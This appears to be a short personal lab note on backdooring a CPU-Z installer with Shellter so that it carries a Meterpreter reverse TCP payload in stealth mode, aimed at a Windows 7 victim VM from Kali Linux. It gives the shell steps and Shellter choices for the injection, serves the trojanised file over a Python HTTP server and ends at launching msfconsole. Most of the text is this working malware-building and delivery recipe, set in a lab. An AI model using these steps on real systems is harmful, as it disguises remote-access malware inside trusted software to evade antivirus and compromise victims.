#topic Metasploit and Shellter

Using Kali Linux for attacking and Windows 7 as a Victim

---
## 2025-08-17
**Set-up:**  
- Install shellter and wine 32 on Kali Linux.
- Install cupz on Kali Linux so we can add a meterpreter reverse tcp payload in it.

**Managing the downloaded file :** 
```
cd Desktop
mkdir av-bypass
cp /home/kali/Downloads/cpu-z_1.96-en.exe av-bypass
cd av-bypass
ls
mv cpu-z_1.96-en.exe cpuz.exe
ls
```

**Adding the payload:**
```
sudo shellter
A (automatic)
PE target: /home/kali/Desktop/av-bypass/cpuz.exe
Enable stealth mode: Y
Use a listed payload or custom? : L
Choose Meterpreter_Reverse_TCP
SET LHOSTS: (ifconfig to check on kali)
SET LPORT: 4321 (remember the port and you can add any port you like, this one is just for example)
...
Injection : Verified!

```

Sharing the file using the HTTP server:
```
(its possible only because both the VMs are on the same NAT network)
(On kali)
`python -m http.server 8080` 

(On Windows)
the IP of kali machine followed by the port no. on the windows browser. 
**192.168.15.8:8080** 
navigate the injected file on the server
```

Using Metasploit:
```
(On kali)
msfconsole

```